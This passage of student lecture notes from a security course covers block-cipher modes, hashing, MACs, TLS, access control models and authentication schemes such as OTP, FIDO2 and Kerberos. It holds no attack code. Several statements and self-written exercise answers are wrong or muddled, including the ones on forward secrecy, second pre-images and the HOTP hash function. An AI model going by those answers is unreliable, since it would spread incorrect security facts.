<p>To solve this - we chain the blocks</p>
<p><strong>CBC</strong> - cipher-block chaining. Take some output from
the cipher text and use that to XOR with the plaintext before encrypting
the block with the key. Basically the IV is the previous block’s
output.</p>
<p>Decryption is the opposite of encrytption.</p>
<p><strong>Problem</strong> If there is an error in one block it
propagates: this effects the block (becomes garbage) that it is in and
the following block (1 bit flip).</p>
<p><strong>Malleability</strong> Flipping one bit of IV, flips the same
bit in the cleartext Flipping one bit in a ciphertext block flips the
same bit in the next cleartext block and mangles the current block
<strong>Always</strong> add <strong>integrity check</strong></p>
<p><strong>Padding oracle attack</strong> - padding needs to be
carefully done.</p>
<h3 id="data-integrity">Data Integrity</h3>
<p><strong>Integrity</strong> - protects agains unauthorized
modification</p>
<p><em>It is easy to flip bits of the cleartext.</em></p>
<p>We need a primitive that:</p>
<ul>
<li>detects any modification of the message</li>
<li>cannot be forged by an attacker</li>
</ul>
<h4 id="hash-function">Hash function</h4>
<p>take an arbitray length input and generate fixed length output.</p>
<p><strong>Porperties</strong>:</p>
<ul>
<li>resistant to pre-image attacks (needs to be one-way function and is
useful for password hashing) - hacker cannot find your password</li>
<li>second pre-image resistance - given a message <span
class="math inline">m_1</span> it is difficult to find a second message
<span class="math inline">m_2</span> such that hash(<span
class="math inline">m_1</span>) = hash(<span
class="math inline">m_2</span>) - hacker cannot find a string that
hashes to the same hash</li>
<li>colision resistance - it is difficult to find any two messages <span
class="math inline">m_1</span>, <span class="math inline">m_2</span>
such that hash(<span class="math inline">m_1</span>) = hash(<span
class="math inline">m_2</span>) (usually that happens because we are
compressing infinitely long text to some amount of bits)</li>
</ul>
<p>What is the complexity of randomly finding a 2nd preimage in a random
function that generates 160bit outputs (e.g. SHA-1)? - naively 2^160
(better: 2^80) ops, but in practice it took 2^63 operations to break
SHA-1.</p>
<p>MD5 - broken SHA-1 - broken in big investment SHA-2 is the current
standard but is related to SHA-1. SHA-3 - no weakness known (not able to
run on embedded system, because it is computationally more difficult)
BLAKE3 - no weakness known, faster, not standard</p>
<h4 id="message-authentication-codes-mac">Message Authentication Codes
(MAC)</h4>
<p>Similar to hash function but involves a symmetric key The same key is
used to generate the MAC and to validate it.</p>
<p>If the key is know to two parties, a correct MAC proves:</p>
<ul>
<li>authentication</li>
<li>integrity</li>
</ul>
<p>This is similar to encryption but does not encrypt, just
verifies.</p>
<h3 id="authenticated-encryption">Authenticated Encryption</h3>
<h4 id="confidentiality-and-integrity">Confidentiality and
Integrity</h4>
<p><strong>Always</strong> require both confidentiality
<strong>and</strong> integrity.</p>
<p>Different approaches:</p>
<ul>
<li>encrypt, then MAC (e.g. IPSec, <em>use whenever possible</em>) - it
allows first to check integrity and then decrypt</li>
<li>MAC then encrypt (e.g. TLS)</li>
<li>encrypt and MAC (e.g. SSH)</li>
</ul>
<p>Modern encryption modes guarantee confidentiality and integrity. They
include additional data that is authenticated but not encrypted - used
for seq number or other metadata.</p>
<p>AEAD (authenticated encryption associated data) E.g. Galois/Counter
Mode (GCM) - common standard together with AES.</p>
<h3 id="public-key-cryptography">Public-key cryptography</h3>
<p>Solves the problem to agree on a pre-shared symmetric key.</p>
<p>Uses a pair of <strong>public</strong> and <strong>private</strong>
key.</p>
<p>Encrypt with a public key and decrypt with a private key. Sign with a
private key (add MAC) and anyone with the public key to check
validity.</p>
<p><strong>Primitives</strong>:</p>
<ul>
<li>public and private key
<ul>
<li>two keys: pub key is widely distributed, private is kept
secrete</li>
<li>must be hard to derive priv from pub</li>
<li>may be easy to derive pub from priv</li>
</ul></li>
<li>Encryption and decryption
<ul>
<li>encrypt with pub key, decrypt with the priv key</li>
<li>hard to decrypt without private key</li>
</ul></li>
</ul>
<h4 id="digital-signatures">Digital signatures</h4>
<p>private key allows signer to generate an unforgeable signature that
attests to the validity of the message.</p>
<p>Examples: software updates, contracts.</p>
<h4 id="diffie-hellman-key-exchange">Diffie-Hellman key exchange</h4>
<p>Protocol for key exchange.</p>
<p><span class="math inline">K = g^{ab}\ mod\ n</span></p>
<p>Algorithm: K = A^b % p = (g^a % p)^b % p = g^ab % p = (g^b % p)^a % p
= B^a % p</p>
<p><strong>Problem</strong>: Man-in-the-middle attack. Giving the
impression to Alice and Bob that they are safe. Therefore there needs to
be integrity through pub keys etc</p>
<h4 id="rsa">RSA</h4>
<p>n is product of thwo large primes p * q</p>
<p>e is compirme with (p-1)(q-1), (ed-1) is multiple of (p-1)(q-1)</p>
<h4 id="eliptic-curve-cryptography-ecc">Eliptic curve cryptography
(ECC)</h4>
<p>Based on the eliptic curves over finite field.</p>
<p>Smaller keys for equivalent security.</p>
<p>ECC could be used for the key exchange, e.g. TLS: ECC Diffie-Hellman
Used for signature.</p>
<p>For example, Sony used ECDSA to sign software for Playstation 3.</p>
<h4 id="crypto-comparison">Crypto Comparison</h4>
<p>Asymmetric is powerful but orders of magnitude slower than symmetric
crypto.</p>
<p>Assymetric is used to exchange a symmetric key, then symmetric takes
over.</p>
<p>All these algorithms are on;y safe with ling enough keys (for 128bits
of security):</p>
<ul>
<li>Symmetric 128 to 256 bits</li>
<li>Asymmetric: RSA 3072 bits, ECC 256 bits</li>
<li>Hash: 256bits</li>
</ul>
<p>Cryptography is used IRL:</p>
<ul>
<li>Symmetric - Kerberos</li>
<li>Asymmetric - WPA3 (not possible to crack WiFi passwords)</li>
</ul>
<h3 id="public-key-distribution">Public key distribution</h3>
<p>Public keys don’t have to be secrete but have to be
<strong>authentic</strong>.</p>
<h4 id="certificate-authority">Certificate Authority</h4>
<p>We need a trusted 3rd party to distribute the public keys.</p>
<p>It does some validation before signing the keys:</p>
<ul>
<li>email</li>
<li>copy of password</li>
<li>this is documented in CPS (certificate practice statement)</li>
</ul>
<p>If we trus the key of CA, we can trus all keys signed by the CA</p>
<p>A ‘signed key’ is a certificate. It contains at least:</p>
<ul>
<li>the identity of the holder (subject)</li>
<li>the validity date of the certificate</li>
<li>the public key of the subject</li>
<li>the signature by the CA</li>
</ul>
<p><strong>Hierarchy of trust</strong>: if you could break the root
certificate, then you could create any certificate which would be valid
but controlled by the attacker. There are intermediary certificates to
reduce to attack surface - if it is hacked, then everything is bad.</p>
<p>Current browsers have a set of root CAs. If there is a chain of
signatures up to a trusted root, the browser trusts the certificate.</p>
<h3 id="crypto-summary">Crypto summary</h3>
<p>Crypto can be symmetric (fast), asymmetric (slow)</p>
<p>Asymmetric should only be used to encrypt short data, as hash of
document, a random symmetric key.</p>
<p>ECC is replacing RSA as asymmetric algorithm (it’s faster, shorter
keys)</p>
<p>Trus is not possible without a trust root.</p>
<h3 id="case-study-tls">Case study: TLS</h3>
<p>TLS provides confidentiality, integrity, and authentication.</p>
<p>Basic idea: build your client-server app without security, add TLS
and it works.</p>
<h4 id="building-blocks">Building blocks</h4>
<p>The server is authenticated with a certificate It proves its identity
by signing some information received from the client with its private
key.</p>
<p>Client and server create a symmetric key using asymmetric crypto.</p>
<h4 id="cipher-suites">Cipher Suites</h4>
<p>Algorithms to be used are specified in cipher suits. E.g.
TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256</p>
<p>There are 5 suites for v1.3.</p>
<h4 id="perfect-forward-security">Perfect Forward Security</h4>
<p><strong>Strong security notion</strong> - session keys should no be
compromised even if long-term secrets are. It is not related to the
client or server data, and it is established after the key exchange. It
must not be stored anywhere such that it does not get recovered.</p>
<p>Diffie-Hellman-like protocol offer Perfect Forward Secrecy (PFS)</p>
<h4 id="tls-uses-public-and-symmetric-crypto">TLS uses public and
symmetric crypto</h4>
<p>Public key crypto:</p>
<ul>
<li>The CA has signed the server’s certificate (and its own root
certificate)</li>
<li>The server signs the key exchange to prove it holds the private
key</li>
<li>Elliptic curve Diffie Hellman is used to exchange a symmetric
key</li>
</ul>
<p>Symmetric crypto:</p>
<ul>
<li>AES block cipher is used in CBC mode for encryption</li>
<li>SHA hash is used for HMAC, for key derivations</li>
</ul>
<h4 id="weaknesses-in-tls">Weaknesses in TLS</h4>
<p>There have been attacks that broke it.</p>
<p>Downgrade attacks Padding oracle attacks</p>
<h4 id="implementing-tls">Implementing TLS</h4>
<p>Assign a new port (HTTPS uses different port), start with TLS
handshake, not compatible with clients that can’t TLS.</p>
<p>Put STARTTLS command on the standard protocol.</p>
<h4 id="deploying-tls-on-the-internet">Deploying TLS on the
Internet</h4>
<p>Using HTTPS is becoming default for Privacy and Security</p>
<h4 id="lets-encrypt---free-certificates">Let’s encrypt - Free
certificates</h4>
<p>To be able to create certificates that are trusted by all browsers,
you must undergo a certification.</p>
<p>To obtain a certificate, you must place specific data</p>
<ul>
<li>in a file on your web server, or</li>
<li>in a DNS entry of your domain</li>
</ul>
<p>Fully automatable: no excuse for not using TLS.</p>
<p>Let’s Encrypt certificates have to be regenerated every few months
because certificate revokation is broken (if it is attacked, the
certificate is still valid until the end of the certificate).</p>
<h4 id="attacks-on-https-and-defences">Attacks on HTTPS and
defences</h4>
<p>SSL Stripping - a MITM makes you believe that the site uses HTTP
instead of HTTPS. Defence - HSTS - HTTP Strict Transport Security. It
has a preload list that has web addresses that should not be connected
through HTTP.</p>
<p>Untrustworth CAs - any CA can give the MITM a trusted certificate in
the name of any server. Using this the server can intercept the server
traffic. Defence:</p>
<ul>
<li>certificate pinning - client-side list of trusted certificates. If
the server shows a certificate which is not signed bu this pin, it does
not accept to connect.</li>
<li>Certificate transparencry - public list of certificates. Servers can
check who requested certificates for their domain and clients can verify
that a cert received from server is in the logs.</li>
</ul>
<h3 id="exercises-2">Exercises 2</h3>
<ol type="1">
<li>Why can’t you use a message authentication code (e.g. HMAC-SHA2) to
sign a contract between a buyer and a seller?
<ul>
<li>Buyer and seller would need to exhange a symmetric key to verify the
contract and MITM could impersonate the seller.</li>
</ul></li>
<li>If asymmetric crypto is really more useful than symmetric, why are
we still using AES?
<ul>
<li>Because symmetric crypto is easier and faster computationally.</li>
</ul></li>
<li>Explain why using the same initialization vector (IV) multiple times
with a stream cipher is more dangerous than with a block cipher.
<ul>
<li>Stream cipher would reveal more statistical invormation</li>
</ul></li>
<li>Explain why AEAD is not malleable
<ul>
<li>AEAD not only encrypts data but also preserves its integrity, and,
for example, in IPSec if the data is modified, it is not being
decrypted.</li>
</ul></li>
<li>Describe an attack that would work if it was possible to find second
pre-images for a hash function.
<ul>
<li>Brute-force attack with a wordlist</li>
</ul></li>
<li>How can you find out all cipher suites supported by a TLS server?
<ul>
<li><em>A</em>:</li>
</ul></li>
<li>Why is perfect forward secrecy important?
<ul>
<li>this is so that MITM attack could not take place, since if the
session key is obtained, there is no authetication guarantee.</li>
</ul></li>
<li>To be sure that your customers connect to your website with https
instead of http, you configure your web server to answer requests on the
http port with a redirection to the https port. • <em>Q</em>: Why does
this not guarantee that all customers will end up using https?
<em>A:</em> • <em>Q</em>: Why does closing the http port still not
guarantee that customers will use https? <em>A:</em> • <em>Q</em>: What
would be a working solution? <em>A:</em></li>
<li>Most mobile e-banking applications use certificate pinning to
validate the certificates of the servers they connect to. Describe an
attack that can be prevented by using a pinned certificate.
<ul>
<li><em>A</em>:</li>
</ul></li>
<li>Which certificate authorities have been used to sign the certificate
of the [www.epfl.ch] web server? <em>A:</em></li>
</ol>
<h2 id="access-control">Access control</h2>
<p>How we can control who gets access to certain object?</p>
<h3 id="basics">Basics</h3>
<p>Defines and enforces <strong>operations</strong> that
<strong>subjects</strong> can do on <strong>objects</strong></p>
<p>E.g. Person has permission to read/write from a socket (this implies
that the subject has been authenticated first)</p>
<h4 id="security-policy">Security policy</h4>
<p><strong>Access rights</strong> describe which subjects can do what
operations on what objects.</p>
<p>A <strong>security policy</strong> is a collection of access rights.
Security policies can be represented as an access control matrix. It
shows what subject can do what on the object.</p>
<h4 id="security-mechanism">Security mechanism</h4>
<p><strong>Security mechanism</strong> tries to prevent operations that
are not authorized bu the security policy.</p>
<p>Allow-list - anything that is not allowed implicitly is denied.
Deny-list - anything that is not denied is allowed. (worse because we
will only figure out if something is not denied after the attack)</p>
<h4 id="principle-of-least-privilege-polp">Principle of Least Privilege
(PoLP)</h4>
<ul>
<li>subjects only have the minimum rights required for their job</li>
<li>i.e. subjects are only allowed minimal operations on objects per
task</li>
<li>this limits the impact if anything should go wrong</li>
</ul>
<p>This also limits the impact of something going wrong.</p>
<p>The challenge in access control is to have a system that is simple to
implement and manage and that is close to the principle of least
privilege.</p>
<p><strong>This is the most important access control
principle</strong></p>
<p>Another way to look at it: if you cannot remove any right without
taking away functionality</p>
<h4 id="multiple-levels-of-access-control">Multiple levels of access
control</h4>
<p>In a network there could be several layers of AC: firewall, server,
application</p>
<p>This provides a question of tradeoff:</p>
<ul>
<li>we want to filter as early as possible, and as early as we can make
a decision (e.g. ssh at firewall level)</li>
<li>only one configuration screw-up would result in successful
attack</li>
<li>bug effects are diminished</li>
<li>sometimes other layers don’t have the correct semantics (e.g. user
profiles in an application is just a file for OS)</li>
</ul>
<h3 id="multiple-approaches-to-access-control">Multiple Approaches to
access control</h3>
<ul>
<li>Role-based Access Control (RBAC)</li>
<li>Discretionary Access Control (DAC)</li>
<li>Mandatory Access Control (MAC)</li>
</ul>
<h4 id="rbac">RBAC</h4>
<p>Simplifies the specification of permissions by grouping users into
roles. (Centered on user roles)</p>
<p>A role can contain multiple permissions.</p>
<p>Why is such a role based system useful? If the system was just users
and rights, it would become a very complicated matrix. Roles simplifies
that because it is an abstraction to group a certain set of roles.</p>
<p>Each subject can have multiple roles. (In Unix each object can only
be in one group - that’s just implementation)</p>
<h5 id="example-rbac-implementation---os">Example RBAC implementation -
OS</h5>
<p>Most OS have the notion of groups Groups can be given a set of
permissions Users can be added to groups</p>
<h5 id="rbac-pros">RBAC Pros</h5>
<p>Easy to grasp the idea of roles</p>
<p>Easy to manage (roles decouple digital entities from permissions)</p>
<p>Easy to tell through roles which permissions a subject has and why
(typically centrally managed)</p>
<h5 id="rbac-cons">RBAC Cons</h5>
<p>Difficult to decide on the granularity of roles - how deep the role
has the access in; leads either to role explosion or roles that are too
broad</p>
<p>Role meaning is fuzzy (based on human explanation)</p>
<p>Uncliear if roles can be shared across differen departments</p>
<h4 id="discretionary-access-control-dac">Discretionary Access Control
(DAC)</h4>
<p>Someone owns the file, and ownes specifies policies to access
resources it owns</p>
<p>Represented by access control list (ACL)</p>
<p><strong>ACL</strong> vs <strong>Capabilities</strong> It could be
seen as a door protected by the bouncer bs a door protected by the
lock</p>
<p>ACL (bouncer): the bouncer knows exactly who can get in People don’t
know where they can get in and where they can’t</p>
<p>Capabilities (key, tied to subject): Doors don’t know hwo will show
up with a key People know exactly for which doors they have a key</p>
<p>ACL is practical when you often have to create or modify rights on
objects Capabilities, when you often create or change rights of subjects
or roles</p>
<h5 id="dac-in-unix-fs">DAC in Unix FS</h5>
<p>Done with ACL Stored in the target object (in the metadata) subjects
are grouped in three categories - owner, group, other.</p>
<p>Three access rights - read, write, execute</p>
<p>Why is it possible for the owner not to be able to rwx? - remove
permissions from yourself from overwriting accidentally.</p>
<p>Only the root has access to modify they /etc/gufw/app_profiles
file</p>
<p>setuid/setgid sets a user/group bit to rights to the file such that
the file will be run with the permissions of the owner of the file
rather than the permissions of the user/group</p>
<p>Programs with setuid can be very dangerous. This is because programs
with setuid bit set are privileged and if they have any bug in them that
could be used to escalate the privileges of the user.</p>
<h5 id="capabilities-in-linux">Capabilities in Linux</h5>
<p>Capabilities are permissions that are related to a subjec, not to an
object.</p>
<p>Linux supports capabilities for processes. e.g.: CAP_CHOWN - make
arbitrary changes to file user ID and group ID CAP_DAC_OVERRIDE - bypass
file read, write, and execute permission checks</p>
<p>Example: dumpcap is the program used by wireshark to sniff network
traffic:</p>
<ul>
<li>it can only be run by root and the members of the wireshark
group</li>
<li>it does not have the setuid bit</li>
</ul>
<p>It is most of the time safer than using setuid</p>
<h5 id="acl-in-windows">ACL in Windows</h5>
<p>ACL is not limited to three types of subjects (used, group, other) -
objects can have a list of ACLs for different users and groups</p>
<p>The Windows administrator account is not the highest privileged
account. The system account NT Authorityis the one that runs the system
and launches services. Thus, you can configure anti-virus software in a
way that even administrators cannot remove it.</p>
<h5 id="capabilities-in-windows">Capabilities in Windows</h5>
<p>Windows has priviliges that act like capabilities:</p>
<ul>
<li>SeTimeZonePrivilege - change time zone</li>
<li>SeSystemtimePrivilege - can change the system time</li>
<li>etc</li>
</ul>
<h4 id="dac-pros-and-cons">DAC pros and cons</h4>
<p>Pros:</p>
<ul>
<li>flexible</li>
<li>easy to manage (owners get to set the permissions themselves)</li>
<li>intuitive</li>
</ul>
<p>Cons:</p>
<ul>
<li>depends on the owners judgement</li>
<li>only works if programs are not malicious and users make no
mistakes</li>
<li>vulnerable to the “Trojan”/declassification problem - a malicious
program run by tan authorized user can read a protected file and write
an unprotected copy of that file. Anybody can read the file.</li>
</ul>
<h4 id="mandatory-access-control-mac">Mandatory access control
(MAC)</h4>
<p>Tries to ensure that even someone with access cannot leak the
data</p>
<p>Historically associated with military-grade information security
(multilevel security - unclassified, confidential, secret,
top-secret)</p>
<p>The system lables both subjects and objects with security labels (can
only be modified by trusted administrators via trusted software)</p>
<p>Security policy: Subjects can only access objects of the same or
lower level</p>
<table>
<thead>
<tr class="header">
<th>subjects/objects</th>
<th>top-secret</th>
<th>secret</th>
<th>confidential</th>
<th>unclassified</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>top-secret</td>
<td>rw</td>
<td>r</td>
<td>r</td>
<td>r</td>
</tr>
<tr class="even">
<td>secret</td>
<td>-</td>
<td>rw</td>
<td>r</td>
<td>r</td>
</tr>
<tr class="odd">
<td>confidential</td>
<td>-</td>
<td>-</td>
<td>rw</td>
<td>r</td>
</tr>
<tr class="even">
<td>unclassified</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>rw</td>
</tr>
</tbody>
</table>
<p>Depends on trusted software and admins for:</p>
<ul>
<li>keeping the system in a protected state, prevents operations that
violate the rules of the matrix</li>
<li>labeling new subjects and objects</li>
<li>perform transitions of labels (e.g. when document is
declassified)</li>
</ul>
<p>Can be used in conjunction with DAC or RBAC</p>
<p><strong>“no-write-down” problem</strong>: A secret subject may read a
secret file and write the contents into a confidential file, thereby
reclassifying the secrecy level and downgrading it (that’s why secret
subjects can write only in secret documents)</p>
<h5 id="mac-confidentiality-vs-integrity">MAC Confidentiality vs
Integrity</h5>
<p>MAC and Confidentiality:</p>
<ul>
<li>When protecting confidentiality, we don’t want users to write to a
lower level (<strong>no write-down</strong>)
<ul>
<li>prevents leaking information from higher to lower levels
(“trojan”)</li>
</ul></li>
<li>Tpical scenario - network access control
<ul>
<li>network is split in zones - internet, internal, secret</li>
<li>firewalls only allow data to flow lower zones to higher zones</li>
</ul></li>
</ul>
<p>MAC and Integrity:</p>
<ul>
<li>We don’t want users from lower level to write into higher levels
(<strong>no write-up</strong>)
<ul>
<li>prevents unauthorized modifications</li>
</ul></li>
<li>E.g.: OS - users can read and execute OS programs but cannot modify
them</li>
</ul>
<h5 id="mac-in-windows">MAC in Windows</h5>
<p>Windows implements MAC for integrity protection (Mandatory Integrity
Control) 4 integrity levels - low, medium, high, system</p>
<p>Objects have a label that says whether write-up, read-up, or
execute-up are allowed. Internet browsers and other programs processing
files received from internet run in low integrity level</p>
<h5 id="mac-in-linux">MAC in Linux</h5>
<p>SELinux and AppArmour are two MAC systems form Linux. They are both
based on the generic Lunux Security Module (LSM)</p>
<p>LSM sits in the kernel and is called just after standard DAC checks
and before access is given</p>
<p>SELinux is used in Android - creates context on the name, role and
domain AppArmour user profiles define access rights to files, network
and capabilities. Is enabled by default in ubuntu</p>
<h5 id="mac-pros-and-cons">MAC pros and cons</h5>
<p>Pros:</p>
<ul>
<li>Addresses the limitations of DAC</li>
<li>Easy to scale</li>
</ul>
<p>Cons:</p>
<ul>
<li>Can be too restrictive, prevent legitimate tasks</li>
<li>Not flexible</li>
</ul>
<h4 id="summary-of-access-control">Summary of access control</h4>
<p>Different types of access control, usage depends on situation:
<strong>Aim</strong> - achieve least privilege at minimal complexity</p>
<p>Moder OSes make use of all of these types:</p>
<ul>
<li>DAC with ACLs for files and most objects</li>
<li>DAC with capabilities for privileged operations</li>
<li>Using groups to implement RBAC (users, admins, hr, marketing)</li>
<li>MAC for protecting the integrity of the system</li>
</ul>
<h3 id="authentication">Authentication</h3>
<p>Access control only makes sense if subjects are authenticated.</p>
<p>3 common flavors to authenticate:</p>
<ul>
<li>something you know - passwords, pin codes</li>
<li>something you own - paper card, smartphone, certificate, electronic
token</li>
<li>something you are - biometrics</li>
</ul>
<p>Two factor authentication requires the use of two factors - password
is often one of the two factors</p>
<h4 id="even-strong-passwords-are-at-risk">Even strong passwords are at
risk</h4>
<p>a stolen password can be replayed by anybody</p>
<p>An attacker can:</p>
<ul>
<li>steal password using client-side malware</li>
<li>obtain passwords by cracking hashes stolen from a server</li>
<li>phish passwords</li>
<li>easesdrop the password</li>
</ul>
<p>Credential stuffing:</p>
<ul>
<li>lists tof usernames and passwords are distributed online</li>
<li>hackers try the same credentials on many different sites</li>
</ul>
<h4 id="password-managers">Password managers</h4>
<p>Store all your credentials in encrypted form</p>
<ul>
<li>your <strong>master password</strong> is used to decrypt the
credentials</li>
<li>to be used on different devices, the encrypted credentials must be
accessible online</li>
</ul>
<p>Where are passwords stored:</p>
<ul>
<li>password manager works offline, uses local file (Keepass)
<ul>
<li>you can choose to host this file in the cloud</li>
</ul></li>
<li>password manager talks to a server in the cloud (Lastpass)
<ul>
<li>browser plug-in or app downloads credentials and decrypts them
locally</li>
<li>you must trust them not to steal your master password</li>
</ul></li>
<li>best of both - the password manager comes with an open source server
that you can host where you want (Bitwarden)</li>
</ul>
<h4 id="authenticationsession-cookies">Authentication/session
cookies</h4>
<p>Cookie is kept by the client and used for authenticating against the
server. Cookie should be uniques for every subject Cookie can be used bu
several clients through forging (if the server encrypts the cookie it
hinders the forging - HMAC)</p>
<h4 id="something-you-own">Something you own</h4>
<p>Typically called hardware/software token.</p>
<p>Bingo card: proves that the user owns the card can easily be copied
without being detected</p>
<p>One time password (OTP) token: Displays a password to be used only
once Password changes with time or click Proves that user owns token at
time of login Cannot be copied easily (secure hw) OATH standard</p>
<p>TAN generator: a calculator that generates a number based on user
input can be used to sign a transaction (Transaction Authentication
Number) Proves that user owns generator based on a smartcard (secure
hardware), typically your bank card</p>
<p>Smartphone OTP is sent by SMS or OTP is generated by app as with OTP
token Proof that user owns phone (or sim card)</p>
<p>Private key in hardware token token signs a challenge different key
for different websites proof that user owns token secure hardware
Universal 2nd Factor (U2F) standard</p>
<h4 id="oath-generation-of-otp">OATH, generation of OTP</h4>
<p><strong>OATH</strong> is a standard that describes:</p>
<ul>
<li>how OTPs are generated from a seed</li>
<li>an XML format for importing seeds into an authentication server</li>
</ul>
<p>Standard OATH tokens exis as hw and sw (e.g. Google Authenticator
app) Generation of the next OTP is either counter or time based
RFC4226</p>
<h5 id="oath-algorithms">OATH algorithms</h5>
<p>Counter based: hotp(k, c) = truncate(hmac - sha512(k,c))</p>
<p>Time-based (initial time t0, time interval x): totp(k, t) = hotp (k,
(t - t0) / x)</p>
<p>Tradeoffs?: —</p>
<h4 id="rsa-secure-ids">RSA Secure IDs</h4>
<p>Secure IDs implement a form of totp Requires random seed to be synced
device and customer</p>
<p>In a massive hack, attackers stole ALL seeds from RSA - the first
true supply chain attack</p>
<h4 id="u2f-fido2">U2F, FIDO2</h4>
<p><strong>Universal 2nd Factor</strong> is a standard developed by the
<strong>FIDO</strong> alliance</p>
<p>Latest version is FIDO2</p>
<p>For each application, the token generates a key pair and gives the
public key to the server</p>
<p>On login, the server sends a random challenge to the client:</p>
<ul>
<li>the client signs the challenge + the name of the donmain of the
server + a signature counter</li>
<li>the client sends the data and the signature to the server</li>
<li>the server verifies the signature</li>
</ul>
<p>Adding the domain prevents phishing attacks Adding the counter
detects cloning of the private key/replay attacks</p>
<p><strong>WebAuthn</strong>: FIDO2 standardizes U2F within the browser
with JS (called WebAuthn)</p>
<p>Additionally makes use of <strong>CTAP</strong> to access the
signature CTAP, the Client to Authenticator Protocol, describes how an
application can ask an authenitcator to generate an assertion
(signature)</p>
<p>Authenticator can be: USB token Smartphone connected by Bluetooth
Authentication module of platform (e.g. biometric)</p>
<p>The assertion contains information whether the user</p>
<ul>
<li>was present</li>
<li>was verified</li>
</ul>
<p>Pros:</p>
<ul>
<li>No problem if the server gets hacked
<ul>
<li>it’s an asymmetric system, the information stored on the server
cannot be used to log in</li>
</ul></li>
<li>No problem if the client gets hacked
<ul>
<li>private key stays in secure hw of client</li>
<li>usage of the key is only possible with user interaction</li>
</ul></li>
<li>very convenient
<ul>
<li>it can use the native authenctication system of the platform</li>
</ul></li>
</ul>
<h4 id="biometrics">Biometrics</h4>
<p>Motivation: Something you know could be guessed Something you own
could be stolen Nothing to remember, nothing that can be lost</p>
<p><strong>Authentication process</strong>:</p>
<ul>
<li>Registration
<ul>
<li>Acquisition</li>
<li>Extraction of characteristics (iris, retina, fingerprint, shape of
head, shape of hand, speech, keystroke timing, handwritten signature on
tablet, gait)</li>
<li>storage of characteristics</li>
</ul></li>
<li>Authentication
<ul>
<li>acquisition</li>
<li>comparison</li>
<li>decision</li>
</ul></li>
</ul>
<p>Limitations</p>
<ul>
<li>Acquisition is never exact</li>
<li>Comparison is never a perfect match (biometric information cannot be
hashed)</li>
<li>Decition is always error prone</li>
</ul>
<p><strong>Error rates</strong>: The decision algorithm must accept a
certain error, sensitivity can be tuned: FAR (false acceptance rate):
the system declares a match when it wasn’t FRR (false rejection rate):
the system declares a non-match although it was a match EER (equal error
rate): when the system is tuned such that FAR=FRR</p>
<p><strong>Biometrics Discussion</strong>: Biometrics and
authentication:</p>
<ul>
<li>no hashing possible (neither for transmission nor for storage), risk
- theft</li>
<li>it is impossible to change a stolen finger</li>
<li>best to store the biometric data locally in protected hw</li>
<li>Example:
<ul>
<li>biometric are stored in passports, not at the customs offices</li>
<li>smartphones store fingerprint data in separate, secure hw</li>
</ul></li>
<li>some sensors can be fooled or replaced</li>
<li>not ideal for remote authentication
<ul>
<li>rather use it for local access to auth key</li>
</ul></li>
</ul>
<p>Biometrics and privacy:</p>
<ul>
<li>biometric data is considered sensitive data by European data
protection laws and the Swiss law:
<ul>
<li>previous Swiss law considered sensitive when revealing race or
health</li>
</ul></li>
<li>Biometric data can reveal health issues (e.g. eye pathologies)</li>
<li>Biometric data can exclude some people (absence of fingerprints or
fingers)</li>
<li>A los of more or less serious research is done with ML and AI to
extract inofmration from faces</li>
</ul>
<h3 id="authentication-protocols">Authentication protocols</h3>
<p>(when sending a password over TLS is not enough)</p>
<h4 id="challenge-response">Challenge-response</h4>
<p>Rather than sending the password to the server: Server sends a random
challenge to the client The client uses the password hash to create a
respose (e.g. encryption or HMAC of the challenge)</p>
<p>Typically, challenge response protocols are vulnerable to MITM
attacks. Microsoft introduced the signature of the packets with a key
derived from th pwd hash (it is actually an HMAC) - the MITM does not
know the key, cannot send any packets</p>
<p><strong>Mutual authentication</strong>: The server and client can
both use a challenge: they can authenticate each other</p>
<p>Examples:</p>
<ul>
<li>newer versions of microsoft challenge-response (SMBv2)</li>
<li>WiFi WPA, WPA2, WPA3</li>
</ul>
<p>Challenge-response protocols may be eavesdropped or suffer cracking
attacks: the attacker recordsa challenge and a response, then they try
all possible passwords to find which would yielf the same response</p>
<h4 id="kerberos">Kerberos</h4>
<p>Kerberos provides authentication and authorization across a network
Subjects receive tickets that they use to access objects</p>
<p>Exclusively based on symmetric keys (developed at MIT in the 80s,
initially deployed in Unix) The main authentication protocol in windows
networks</p>
<h5 id="kerberos-tickets-authenticators">Kerberos tickets,
authenticators</h5>
<p>By presenting a ticket a client gets access to a service from a
server</p>
<p>The authenticator proves that the client is the legitimate owner of
the ticket.</p>
<p>The ticket contains:</p>
<ul>
<li>c - the client’s identity</li>
<li>a - its IP</li>
<li>v - a validity period</li>
<li>Kc,s - a session key used between the client and the destination
server.</li>
</ul>
<p>The ticket is encrypted with the key of the destination server.</p>
<p>The authenticator is an id and a timestamp encrypted with a session
key.</p>
<h5 id="kerberos-authentication-server-ticket-server">Kerberos
authentication server, ticket server</h5>
<p>Kerberos uses a 3-phase approach:</p>
<ul>
<li>1-2 - an authentication server (AS) authenticates the client and
delivers a ticket granting ticket (TGT)</li>
<li>3-4 - the client can then present the TGT to the ticket granting
server (TGS) to get a ticket for the service</li>
<li>5-6 - the client can access the service</li>
</ul>
<h5 id="kerberos-authentication">Kerberos authentication</h5>
<p>The password hash is used as key Kc</p>
<ol type="1">
<li>The client asks for a ticket for the TGS, sends <em>c,tgs</em></li>
<li>the AS responds with the ticket T_c,tgs (the ticket granting ticket)
and an encrypted session key ENC_Kc(K_c,tgs)</li>
</ol>
<p>the client knows Kc and can decrypt the session key</p>
<h5 id="kerberos-authorization">Kerberos authorization</h5>
<p>the client creates an authenticator with K_c,tgs</p>
<ol start="3" type="1">
<li>the client sends the ticket T_c,tgs and A_c,tgs to the TGS.</li>
<li>the TGS verifies the authenticaor and responds with a service ticket
T_c,s and an encrypted session key ENC_K_c,tgs (K_c,s)</li>
</ol>
<p>The client knows K_c,tgs and can decrypt the session key.</p>
<h5 id="kerberos-access">Kerberos access</h5>
<p>the client creates an authenticator with K_c,s</p>
<ol start="5" type="1">
<li>the client sends the ticket T_c,s and A_c,s to the server</li>
<li>the server verifies the authenticaor</li>
</ol>
<p>the client can now use the service</p>
<h5 id="kerberos-discussion">Kerberos discussion</h5>
<p>the ticket obtained from the AS is called the <strong>ticket grantic
ticket (TGT)</strong> because it is used to get the other tickets</p>
<p>To validate a ticket, a server:</p>
<ul>
<li>decrypts the ticket</li>
<li>validates the <strong>IP address</strong> and the <strong>validity
period</strong></li>
<li>uses the included session key to
<ul>
<li>decrypt the authenticator</li>
